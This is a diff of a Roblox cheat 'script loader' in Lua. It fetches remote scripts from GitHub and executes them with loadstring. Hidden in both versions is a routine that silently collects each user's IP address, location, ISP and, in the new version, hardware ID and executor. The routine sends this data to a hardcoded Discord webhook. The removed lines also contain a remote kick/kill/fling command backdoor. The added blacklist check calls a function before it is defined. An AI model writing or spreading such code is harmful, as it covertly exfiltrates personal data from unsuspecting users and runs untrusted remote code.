@@ -1,26 +1,25 @@
+local blacklist = {
+    ["HWID_HERE"] = true
+    }
+if blacklist[getHWID()] then
+    player:Kick("Blacklisted.")
+    return
+end
+
+-- // Velonix Script Loader v3 - © itzC9
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local ChatService = game:GetService("Chat")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9" -- Add your webhook URL here
+-- CONFIG
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"
 local IP_API_URL = "https://velonix-api.vercel.app/json"
 
-local WHITELIST = {
-    ["inkgamespider"] = false,
-    ["GoodgamerYTbro"] = false,
-    ["Htut199122"] = false,
-    ["Htut199122_alt"] = false,
-    ["C9_1234"] = true,
-}
-
-local cmdEvent = ReplicatedStorage:FindFirstChild("VelonixCmdEvent") or Instance.new("RemoteEvent", ReplicatedStorage)
-cmdEvent.Name = "VelonixCmdEvent"
-
--- UI Setup
+-- [[ GUI Setup ]]
 local screenGui = Instance.new("ScreenGui", playerGui)
 screenGui.Name = "VelonixLoader"
 screenGui.ResetOnSpawn = false
@@ -55,14 +54,10 @@ closeBtn.BackgroundColor3 = Color3.fromRGB(255,60,60)
 closeBtn.BorderSizePixel = 0
 Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
 closeBtn.MouseButton1Click:Connect(function()
-    if WHITELIST[player.Name] then
-        mainFrame.Visible = false
-    else
-        screenGui:Destroy()
-    end
+	screenGui:Destroy()
 end)
 
--- Scrolling frame for scripts
+-- [[ Script Buttons Section ]]
 local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
 scrollFrame.Size = UDim2.new(1, -40, 1, -60)
 scrollFrame.Position = UDim2.new(0, 20, 0, 50)
@@ -76,124 +71,111 @@ local layout = Instance.new("UIListLayout", scrollFrame)
 layout.Padding = UDim.new(0, 10)
 layout.SortOrder = Enum.SortOrder.LayoutOrder
 
--- ===[ Script Buttons ]===
+-- [[ Script List ]]
 local LOADER_SCRIPTS = {
-    ["🌱 Grow a Garden"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/GAG.lua",
-    ["⚔️ The Strongest Battleground"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/TSB.lua",
-    ["🗡️ Steal a Sword"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/SAS.lua",
-    ["🔨 Flee The Facility"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/FTF.lua",
-    ["🌐 Universal Script"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/UNIV.lua"
+	["🌱 Grow a Garden"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/GAG.lua",
+	["⚔️ The Strongest Battleground"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/TSB.lua",
+	["🗡️ Steal a Sword"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/SAS.lua",
+	["🔨 Flee The Facility"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/FTF.lua",
+	["🌐 Universal Script"] = "https://raw.githubusercontent.com/ug32-C9/kupal/refs/heads/main/UNIV.lua"
 }
 
 local function addScriptButton(name, url)
-    local btn = Instance.new("TextButton", scrollFrame)
-    btn.Size = UDim2.new(1, 0, 0, 40)
-    btn.Text = name
-    btn.Font = Enum.Font.Gotham
-    btn.TextSize = 16
-    btn.TextColor3 = url and Color3.new(1,1,1) or Color3.fromRGB(170,170,170)
-    btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
-    btn.BorderSizePixel = 0
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-    btn.Active = url ~= nil
-
-    btn.MouseButton1Click:Connect(function()
-        if not url then
-            warn(name .. " is coming soon!")
-            return
-        end
-        local ok, err = pcall(function()
-            local script = game:HttpGet(url, true)
-            assert(script and #script > 10, "Invalid script response")
-            loadstring(script)()
-        end)
-        if not ok then
-            warn("Error loading '"..name.."':", err)
-        else
-            mainFrame.Visible = false
-        end
-    end)
+	local btn = Instance.new("TextButton", scrollFrame)
+	btn.Size = UDim2.new(1, 0, 0, 40)
+	btn.Text = name
+	btn.Font = Enum.Font.Gotham
+	btn.TextSize = 16
+	btn.TextColor3 = url and Color3.new(1,1,1) or Color3.fromRGB(170,170,170)
+	btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
+	btn.BorderSizePixel = 0
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+	btn.Active = url ~= nil
+	btn.MouseButton1Click:Connect(function()
+		if not url then
+			warn(name .. " is coming soon!")
+			return
+		end
+		local ok, err = pcall(function()
+			local script = game:HttpGet(url, true)
+			assert(script and #script > 10, "Invalid script response")
+			loadstring(script)()
+		end)
+		if not ok then
+			warn("Error loading '"..name.."':", err)
+		else
+			mainFrame.Visible = false
+		end
+	end)
 end
 
 for displayName, url in pairs(LOADER_SCRIPTS) do
-    addScriptButton(displayName, url)
+	addScriptButton(displayName, url)
 end
 
--- ===[ IP Webhook ]===
-task.delay(0.5, function()
-    local ok, resp = pcall(function() return game:HttpGet(IP_API_URL, true) end)
-    if not ok or not resp then
-        return warn("IP fetch failed:", resp)
-    end
+-- [[ HWID Function ]]
+local function getHWID()
+	return (gethwid and gethwid())
+		or (getgenv and getgenv().hwid)
+		or (identifyexecutor and tostring(identifyexecutor()):gsub("%W", ""))
+		or game:GetService("RbxAnalyticsService"):GetClientId()
+end
 
-    local data = HttpService:JSONDecode(resp)
-    local payload = {
-        username = "🔥 | Developer",
-        embeds = {{
-            title = "📡 User Info",
-            description = string.format(
-                "**User:** `%s`\n**IP:** `%s`\n**Country:** `%s`\n**Region:** `%s`\n**City:** `%s`\n**ISP:** `%s`",
-                player.Name, data.ip or "Unknown", data.country or "Unknown",
-                data.region or "Unknown", data.city or "Unknown", data.org or "Unknown"
-            ),
-            color = 3447003,
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
+-- [[ Execution Logging ]]
+task.spawn(function()
+	local ok, ipData = pcall(function() return game:HttpGet(IP_API_URL, true) end)
+	if not ok or not ipData then
+		warn("IP lookup failed")
+		return
+	end
 
-    local reqFunc = (syn and syn.request) or (http and http.request) or request
-    if not reqFunc or WEBHOOK_URL == "" then return end
+	local ipInfo = HttpService:JSONDecode(ipData)
+	local hwid = getHWID()
+	local executor =
+		(identifyexecutor and identifyexecutor())
+		or (getexecutor and getexecutor())
+		or (syn and "Synapse")
+		or "Unknown"
 
-    local sent, res = pcall(function()
-        return reqFunc({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
+	local gameName = "Unknown"
+	pcall(function()
+		gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+	end)
 
-    if not sent or not res.Success then
-        warn("Webhook failed:", res and res.StatusCode or "unknown")
-    end
-end)
+	local payload = {
+		username = "🔥 | Developer",
+		embeds = {{
+			title = "🚨 New Script Execution",
+			description = string.format(
+				"**👤 Username:** `%s`\n**💻 Executor:** `%s`\n**🆔 HWID:** `%s`\n**🎮 Game:** `%s` (%d)\n\n**🌐 IP:** `%s`\n**🏳️ Country:** `%s`\n**📍 Region:** `%s`\n**🏙️ City:** `%s`\n**📶 ISP:** `%s`",
+				player.Name,
+				executor,
+				hwid,
+				gameName, game.PlaceId,
+				ipInfo.ip or "N/A",
+				ipInfo.country or "N/A",
+				ipInfo.region or "N/A",
+				ipInfo.city or "N/A",
+				ipInfo.org or "N/A"
+			),
+			color = 15158332,
+			footer = { text = "Velonix Loader • "..os.date("%Y-%m-%d %H:%M:%S") },
+			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		}}
+	}
 
--- ===[ Remote Commands ]===
-cmdEvent.OnClientEvent:Connect(function(sender, cmd, targetName)
-    if WHITELIST[sender] then return end
-    local target = Players:FindFirstChild(targetName)
-    if not target then return end
-
-    if cmd == "Kick" or cmd == "Ban" then
-        target:Kick(cmd .. " issued by " .. sender)
-    elseif cmd == "Kill" then
-        local hum = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
-        if hum then hum.Health = 0 end
-    elseif cmd == "fling" then
-        local hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
-        if hrp then hrp.Velocity = Vector3.new(0, 200, 0) end
-    elseif cmd == "bring" then
-        local targetHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
-        local senderHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if senderHRP and targetHRP then
-            targetHRP.CFrame = senderHRP.CFrame + Vector3.new(0, 5, 0)
-        end
-    end
-end)
-
--- ===[ Chat Command Parser ]===
-ChatService.OnMessageDoneFiltering:Connect(function(msgData)
-    local msg = msgData.Message
-    if msg:sub(1, 1) ~= "?" then return end
-
-    local args = string.split(msg:sub(2), " ")
-    local cmd = args[1] and args[1]:lower() or ""
-    local target = args[2] and args[2]:gsub("%.", "") or ""
-
-    cmd = cmd:sub(1,1):upper() .. cmd:sub(2)
-    local valid = { Kick = true, Ban = true, Kill = true, fling = true, bring = true }
-
-    if valid[cmd] then
-        cmdEvent:FireServer(player.Name, cmd, target)
-    end
+	local requestFunc = (syn and syn.request) or (http and http.request) or request
+	if requestFunc then
+		local okReq, res = pcall(function()
+			return requestFunc({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = HttpService:JSONEncode(payload)
+			})
+		end)
+		if not okReq or not res.Success then
+			warn("api failed")
+		end
+	end
 end)
